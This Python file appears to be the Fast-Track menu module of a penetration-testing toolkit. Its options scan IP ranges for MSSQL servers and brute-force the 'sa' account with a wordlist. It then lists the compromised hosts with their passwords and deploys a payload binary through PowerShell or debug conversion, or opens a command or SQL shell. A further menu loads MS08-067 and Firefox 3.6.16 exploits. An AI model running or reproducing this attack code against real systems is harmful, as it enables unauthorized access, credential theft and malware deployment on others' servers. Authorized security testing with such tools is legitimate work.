#!/usr/bin/python
from src.core.setcore import *
from src.core.menu import text
import subprocess

try:
        import _mssql
except ImportError:
        PrintError("PYMSSQL is not installed. MSSQL attacks will not work!")
        operating_system = check_os()
        if operating_system == "windows":
                PrintStatus("You can download PYMSSQL executables from here: http://www.lfd.uci.edu/~gohlke/pythonlibs/")
        raw_input("Press {return} to continue.")
        pass
#
#
# Fast-Track Main options and interface menus
#
#
check_mssql()
try:
	while 1:
		###################################################
		#        USER INPUT: SHOW WEB ATTACK MENU         #
		###################################################

		CreateMenu(text.fasttrack_text, text.fasttrack_menu)
		attack_vector = raw_input(setprompt(["19"], ""))

		if attack_vector == "99" or attack_vector == "quit" or attack_vector == "exit":
			break

		##################################
		##################################
		# mssql_scanner
		##################################
		##################################
		if attack_vector == "1":
			# start the menu
			CreateMenu(text.fasttrack_mssql_text1, text.fasttrack_mssql_menu1)
			# take input here
			attack_vector_sql = raw_input(setprompt(["19","21"], ""))


			#
			# option 1 scan and attack, option 2 connect directly to mssql
			# if 1, start scan and attack
			#
			if attack_vector_sql == '1':
				# grab ip address
				range = raw_input(setprompt(["19","21","22"], "Enter the CIDR notation or single IP address (ex. 192.168.1.1/24)"))
				# grab the port
				port = raw_input(setprompt(["19","21","22"], "Enter the port number to scan [1433]"))
				# if default use 1433
				if port == "": port = 1433
				# ask for a wordlist
				wordlist = raw_input(setprompt(["19","21","22"], "Enter path to a wordlist file [use default wordlist]"))
				if wordlist == "": wordlist =  "default"
				# specify the user to brute force
				username = raw_input(setprompt(["19","21","22"], "Enter the username to brute force [sa]"))
				# default to sa
				if username == "": username = "sa"
				# import the mssql module from fasttrack
				from src.fasttrack import mssql
				# sql_servers
				sql_servers = mssql.scan(range, port, port)
				# this will hold all of the SQL servers eventually
				master_list = ""
				# set a base counter
				counter = 0
				if sql_servers != False:
					# get rid of extra data from port scanner
					sql_servers = sql_servers.replace(":%s OPEN" % (port), "")
					# split into tuple for different IP address
					sql_servers = sql_servers.split(",")
					# start loop and brute force
					for servers in sql_servers:
						# this will return the following format ipaddr + "," + username + "," + str(port) + "," + passwords
                                                if servers != "":
        						sql_success = mssql.brute(servers, username, port, wordlist)
	        					if sql_success != False:
		        					# after each success or fail it will break into this to the above with a newline to be parsed later
			        				master_list = master_list + sql_success + ":"
				        			counter = 1

                                # if we didn't successful attack one
                                if counter == 0:
                                        PrintWarning("Sorry. Unable to locate or fully compromise a MSSQL Server.")
                                        pause = raw_input("Press {return} to continue to the main menu.")
				# if we successfully attacked one
				if counter == 1:
					# need to loop to keep menu going
					while 1:
						# set a counter to show compromised servers 
						counter = 1
						# here we list the servers we compromised
						master_names = master_list.split(":")
						PrintStatus("Select the compromise SQL server you want to interact with:\n")
						for success in master_names:
							if success != "":
								success = success.rstrip()
								success=success.split(",")
								success= bcolors.BOLD + success[0] + bcolors.ENDC + "   username: " + bcolors.BOLD + "%s" % (success[1]) + bcolors.ENDC + " | password: " + bcolors.BOLD + "%s" % (success[3]) + bcolors.ENDC
								print "   " + str(counter) + ". " + success
								# increment counter 
								counter = counter + 1

						print "\n   99. Return back to the main menu.\n"
						# select the server to interact with
						select_server = raw_input(setprompt(["19","21","22"], "Select the SQL server to interact with [1]"))						
						# default 1
						if select_server == "quit" or select_server == "exit": break
						if select_server == "": select_server = "1"
						if select_server == "99": break
						counter = 1
						for success in master_names:
							if success != "":
								success = success.rstrip()
								success = success.split(",")
								# if we equal the number used above
								if counter == int(select_server):
										#  ipaddr + "," + username + "," + str(port) + "," + passwords
										print "\nHow do you want to deploy the binary via debug (win2k, winxp, win2003) or powershell (vista,win7)\n\n   1. Windows Powershell\n   2. Windows Debug Conversion\n   3. Standard Windows Shell\n\n   99. Return back to the main menu.\n"
										option = raw_input(setprompt(["19","21","22"], "Which deployment option do you want [1]"))
										if option == "": option = "2"
										# if 99 then break
										if option == "99": break
										# specify we are using the fasttrack option, this disables some features
										filewrite = file("src/program_junk/fasttrack.options", "w")
										filewrite.write("none")
										filewrite.close()
                                                                                # import fasttrack
                                                                                if option == "1" or option == "2":
        										# import payloads for selection and prep
	        									try: reload(src.core.payloadgen.create_payloads)
		        								except: import src.core.payloadgen.create_payloads									       
	        									mssql.deploy_hex2binary(success[0], success[2], success[1], success[3], option)
                                                                                # straight up connect
                                                                                if option == "3":
                                                                                        mssql.cmdshell(success[0], success[2], success[1], success[3], option)
								# increment counter
								counter = counter + 1

			#  
			# if we want to connect directly to a SQL server
			#
			if attack_vector_sql == "2":
				sql_server = raw_input(setprompt(["19","21","23"], "Enter the hostname or IP address of the SQL server"))
				sql_port = raw_input(setprompt(["19","21","23"], "Enter the SQL port to connect [1433]"))
				if sql_port == "": sql_port = "1433"
				sql_username = raw_input(setprompt(["19","21","23"], "Enter the username of the SQL Server [sa]"))
				# default to sa
				if sql_username == "": sql_username = "sa"				
				sql_password = raw_input(setprompt(["19","21","23"], "Enter the password for the SQL server"))
				PrintStatus("Connecting to the SQL server...")
				# try connecting
				# establish base counter for connection
				counter = 0
				try:
					conn = _mssql.connect(sql_server + ":" + str(sql_port), sql_username, sql_password)
					counter = 1
				except Exception, e:
                                        print e
					PrintError("Connection to SQL Server failed. Try again.")
				# if we had a successful connection
				if counter == 1:
					PrintStatus("Dropping into a SQL shell. Type quit to exit.")
					# loop forever
					while 1:
						# enter the sql command
						sql_shell = raw_input("Enter your SQL command here: ")
						if sql_shell == "quit" or sql_shell == "exit": 
							PrintStatus("Exiting the SQL shell and returning to menu.")
							break

						try:
							# execute the query
							sql_query = conn.execute_query(sql_shell)
							# return results
							print "\n"							
							for data in conn:
								data = str(data)
								data = data.replace("\\n\\t", "\n")
								data = data.replace("\\n", "\n")
								data = data.replace("{0: '", "")
								data = data.replace("'}", "")
								print data
						except Exception, e:
							PrintWarning("\nIncorrect syntax somewhere. Printing error message: " + str(e))



		##################################
		##################################
		# exploits menu
		##################################
		##################################
		if attack_vector == "2":
			# start the menu
			CreateMenu(text.fasttrack_exploits_text1, text.fasttrack_exploits_menu1)
			# enter the exploits menu here
			range = raw_input(setprompt(["19","24"], "Enter the IP ranges to attack (nmap syntax only)"))

			# ms08067
			if range == "1":
				try: reload(src.fasttrack.exploits.ms08067)
				except: import src.fasttrack.exploits.ms08067

			# firefox 3.6.16
			if range == "2":
				try: reload(src.fasttrack.exploits.firefox_3_6_16)
				except: import src.fasttrack.exploits.firefox_3_6_16
# handle keyboard exceptions
except KeyboardInterrupt: 
	pass
